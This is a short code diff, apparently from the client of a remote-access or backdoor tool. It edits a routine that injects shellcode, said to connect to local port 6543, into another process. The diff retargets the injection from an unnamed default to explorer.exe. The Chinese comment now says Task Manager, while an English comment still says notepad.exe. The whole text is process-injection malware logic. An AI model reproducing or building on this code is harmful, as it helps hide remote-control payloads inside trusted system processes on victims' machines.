@@ -262,7 +262,7 @@ int main(int argc, const char *argv[])
         g_ConnectAddress.SetServer(saved_ip.c_str(), saved_port);
     }
 
-    // 此 Shell code 连接本机6543端口，注入到记事本
+    // 此 Shell code 连接本机6543端口，注入到任务管理器
     if (g_ConnectAddress.iStartup == Startup_InjSC) {
         // Try to inject shell code to `notepad.exe`
         // If failed then run memory DLL
@@ -272,7 +272,7 @@ int main(int argc, const char *argv[])
         do {
             if (sizeof(void*) == 4) // Shell code is 64bit
                 break;
-            if (!(pid = inj.InjectProcess(nullptr, ok))) {
+            if (!(pid = inj.InjectProcess("explorer.exe", ok))) {
                 break;
             }
             HANDLE hProcess = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, pid);
